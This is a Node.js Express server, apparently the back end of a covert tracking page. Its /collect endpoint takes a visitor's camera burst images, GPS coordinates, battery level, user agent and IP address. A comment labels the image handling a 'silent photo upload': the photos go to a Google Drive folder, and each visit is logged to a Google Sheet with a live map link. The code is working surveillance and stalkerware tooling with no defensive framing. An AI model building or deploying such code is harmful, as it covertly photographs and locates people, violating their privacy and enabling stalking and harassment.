import 'dotenv/config';
import express from 'express';
import { google } from 'googleapis';
import path from 'path';
import { fileURLToPath } from 'url';
import { Readable } from 'stream';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

const privateKey = (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n');

const auth = new google.auth.JWT(
  process.env.GOOGLE_CLIENT_EMAIL,
  null,
  privateKey,
  ['https://www.googleapis.com/auth/spreadsheets', 'https://www.googleapis.com/auth/drive.file']
);

const drive = google.drive({ version: 'v3', auth });
const sheets = google.sheets({ version: 'v4', auth });

const FOLDER_ID = '1Kw94qJ-9DkeZHeiEfe5LwcA9pBTwCXni';

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/collect', async (req, res) => {
  try {
    const { ts, hints, battery, location, burstImages } = req.body;
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

    let driveViewLink = "No Image";

    // 1. SILENT PHOTO UPLOAD
    if (burstImages && burstImages[0]) {
      const imgBase64 = burstImages[0].split(',')[1];
      const buffer = Buffer.from(imgBase64, 'base64');
      
      const driveFile = await drive.files.create({
        requestBody: {
          name: `Capture_${Date.now()}.jpg`,
          parents: [FOLDER_ID]
        },
        media: { mimeType: 'image/jpeg', body: Readable.from(buffer) },
        supportsAllDrives: true,
        fields: 'id, webViewLink'
      });
      driveViewLink = driveFile.data.webViewLink;
    }

    // 2. LIVE MAP LINK GENERATOR
    const mapLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;

    // 3. LOG TO GOOGLE SHEET
    const row = [ts, ip, hints?.ua, battery?.levelPercent + '%', mapLink, driveViewLink];

    await sheets.spreadsheets.values.append({
      spreadsheetId: process.env.GOOGLE_SHEET_ID,
      range: 'Logs!A1',
      valueInputOption: 'USER_ENTERED',
      requestBody: { values: [row] }
    });

    res.json({ ok: true });
  } catch (err) {
    console.error("Error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

app.listen(process.env.PORT || 8080);
